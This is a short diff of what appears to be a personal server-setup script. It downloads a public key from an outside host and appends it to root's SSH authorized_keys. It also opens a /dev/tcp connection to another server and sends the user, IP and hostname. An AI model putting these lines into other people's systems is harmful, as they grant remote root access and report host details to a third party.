@@ -8,9 +8,8 @@ SSHPATH="/root/.ssh"
 
 mkdir -p "$SSHPATH"
 
-rm -f "$SSHPATH/authorized_keys"
 echo "Downloading pubkey..."
-curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey
+curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
 
 USER=`whoami`
 # hostname -I returns trailing space
@@ -20,8 +19,8 @@ HOSTNAME=`hostname`
 SERVER="boesen.science"
 PORT=2043
 
-exec 3<>/dev/tcp/${SERVER}/${PORT}
-printf "${USER} ${IP} ${HOSTNAME}" >&3
+exec 3<>/dev/tcp/$SERVER/$PORT
+printf "$USER $IP $HOSTNAME" >&3
 
 cat <&3
 
